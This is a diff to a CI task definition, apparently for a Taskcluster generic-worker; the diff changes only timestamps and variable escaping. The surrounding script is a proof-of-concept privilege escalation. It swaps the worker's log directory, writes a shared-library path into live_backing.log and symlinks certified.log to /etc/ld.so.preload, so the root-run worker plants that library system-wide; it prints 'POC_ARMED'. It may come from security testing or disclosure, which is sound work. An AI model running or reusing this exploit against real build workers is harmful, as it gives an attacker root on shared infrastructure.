@@ -12,9 +12,9 @@ tasks:
     routes: []
     priority: low
     retries: 0
-    created: "2026-08-13T17:00:23.000Z"
-    deadline: "2026-08-13T17:30:23.000Z"
-    expires: "2026-08-14T17:00:23.000Z"
+    created: "2026-08-13T17:05:21.000Z"
+    deadline: "2026-08-13T17:35:21.000Z"
+    expires: "2026-08-14T17:05:21.000Z"
     scopes: []
     payload:
       command:
@@ -23,7 +23,7 @@ tasks:
           - |-
             set -euo pipefail
             umask 077
-            cd "${TASK_WORKDIR}"
+            cd "$${TASK_WORKDIR}"
 
             test "$(id -u)" -ne 0
             test "$(uname -m)" = x86_64
@@ -43,7 +43,7 @@ tasks:
             # even though the worker created the original directory as root with mode 0700.
             mv generic-worker generic-worker.original
             mkdir -m 0700 generic-worker
-            printf '%s\n' "${TASK_WORKDIR}/preload_log_marker.so" > generic-worker/live_backing.log
+            printf '%s\n' "$${TASK_WORKDIR}/preload_log_marker.so" > generic-worker/live_backing.log
             ln -s /etc/ld.so.preload generic-worker/certified.log
 
             echo 'POC_ARMED: one-shot root UID marker; preload self-cleans on activation'
